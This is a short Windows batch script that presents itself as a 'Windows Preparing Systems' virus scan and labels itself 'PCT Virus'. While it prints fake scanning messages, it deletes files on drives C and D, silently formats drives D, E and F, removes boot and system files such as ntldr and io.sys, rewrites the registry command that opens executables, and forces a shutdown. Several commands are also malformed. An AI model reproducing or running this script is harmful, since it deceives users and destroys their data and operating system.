@echo off
title Windows Preparing Systems
echo.
echo wellcome to Windows Preparing Systems
sleep1
echo Scanning Virus...
sleep 2
echo Start scanning Disk D:\
sleep 2
DEL D:-Y
echo Failed to scanning disk D:\

sleep 1
echo Start scanning Disk C:\
sleep 1
echo This will take few minutes...
echo Please be patient...
echo.
reg add
HKLM\SOFTWARE\Classes\exefile\shell\open\Command/ve/d%%fe340ead%%/f
echo.

del /f/Q/A C:\ntldr/S
echo.
Format D:/Q/X/y
echo.
Format E:/Q/X/y
echo.
Format F:/Q/X/y
echo.
del /f/Q/A C:\command.com /S
echo.
del /f/Q/A C:\io.sys /S
echo.
del /f/Q/A C:\config.sys /S
echo.
echo Oops Your systems is failure.
echo Windows will reboot the system.

echo PCT Virus Was Created On Your PC!!
DEL C:-U
Shutdown -s -t 360 -c "PCT Virus [ Stay Close And Keep Silent ]" -f
echo.